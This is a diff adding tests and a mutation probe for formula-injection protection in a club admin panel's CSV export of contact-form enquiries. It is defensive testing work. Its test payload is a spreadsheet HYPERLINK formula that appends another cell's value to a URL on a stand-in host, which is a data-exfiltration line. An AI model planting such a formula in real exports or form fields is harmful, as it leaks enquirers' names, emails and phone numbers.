@@ -2540,6 +2540,47 @@ export async function panelChecks() {
       half.slice(0, 200));
   }
 
+  /* ---------------------------------------------------------------------
+     A CSV THE CLUB EXPORTS IS A FILE A STRANGER HALF WROTE.
+
+     The Inbox's name, subject, message and phone columns come off the public
+     contact form through the anonymous insert the forms depend on, and the
+     same helper writes the supporter list and the sponsorship pipeline. Excel
+     and Google Sheets evaluate a cell that OPENS with =, +, - or @, so a
+     formula typed into a name field runs on the club's machine against a file
+     holding every other enquirer's name, email and telephone number.
+
+     ASKED OF THE SHIPPED HELPER, not of the source, and asked with a payload
+     that is also valid CSV - the quoting was always correct and was never the
+     defence, so a check that only parsed the row back would have passed
+     throughout. */
+  {
+    const ctx = await PR.boot({ rows });
+    const csv = ctx.win.CPU && ctx.win.CPU.csv;
+    check('the panel ships the shared CSV helper', typeof csv === 'function');
+    if (typeof csv === 'function') {
+      const payload = '=HYPERLINK("https://x/?q="&C2,"your enquiry")';
+      const line = csv([{ name: payload, email: 'a@b.co' }], ['name', 'email']).split('\n')[1];
+      /* The cell must not START a formula. Quoted or not, the spreadsheet
+         reads what the parser hands back. */
+      check('a formula in an enquiry name cannot open a cell in the exported CSV',
+        !/^"?=/.test(line) && line.indexOf("'=HYPERLINK") > -1, line.slice(0, 90));
+      /* And it is still the same text, so the club can read its own lead. */
+      check('and the name is still legible in the export',
+        line.indexOf('your enquiry') > -1 && line.indexOf('a@b.co') > -1, line.slice(0, 90));
+      /* Every character a spreadsheet treats as a formula opener, not just =. */
+      check('+, - and @ are neutralised as well as =',
+        ['+1', '-1', '@x'].every((v) => csv([{ a: v }], ['a']).split('\n')[1].charAt(0) === "'"),
+        ['+1', '-1', '@x'].map((v) => csv([{ a: v }], ['a']).split('\n')[1]).join(' | '));
+      /* The negative: an ordinary cell is NOT given an apostrophe, or every
+         export would be littered with them and the check above would pass on
+         a helper that quoted everything blindly. */
+      check('an ordinary cell is left exactly as it was',
+        csv([{ a: 'Andrew Allen' }], ['a']).split('\n')[1] === 'Andrew Allen',
+        csv([{ a: 'Andrew Allen' }], ['a']));
+    }
+  }
+
   return out;
 }
 
@@ -2886,6 +2927,33 @@ export async function panelProbes() {
       name: 'probe: an empty awaiting list turns the played-and-not-recorded check red',
       cond: res.body.querySelectorAll('[data-due]').length === 0,
       detail: 'a fixture was still offered with nothing seeded',
+    });
+  }
+
+  /* PROBE: take the formula guard out of the shipped CSV helper and confirm
+     the export check goes red.
+
+     Aimed at the REGEX, which a minifier copies verbatim, rather than at the
+     variable it tests - that name is the minifier's to choose, and a probe
+     aimed at a renamed identifier finds nothing, throws, and asks to be
+     re-aimed rather than silently passing. Neutered instead of deleted, so
+     the helper still runs and the check is answering about the guard rather
+     than about a file that would not parse. */
+  {
+    const ctx = await PR.boot({
+      rows,
+      transform: (src, file) => (file === 'control.js'
+        ? bust(src, '/^[=+\\-@\\t\\r]/', '/^zzz-no-such-opener/')
+        : src),
+    });
+    const csv = ctx.win.CPU && ctx.win.CPU.csv;
+    const line = typeof csv === 'function'
+      ? csv([{ a: '=HYPERLINK("https://x/?q="&C2,"your enquiry")' }], ['a']).split('\n')[1]
+      : '';
+    results.push({
+      name: 'probe: removing the formula guard turns the CSV export check red',
+      cond: typeof csv === 'function' && /^"?=/.test(line),
+      detail: line.slice(0, 80) || 'CPU.csv was not reachable',
     });
   }
 
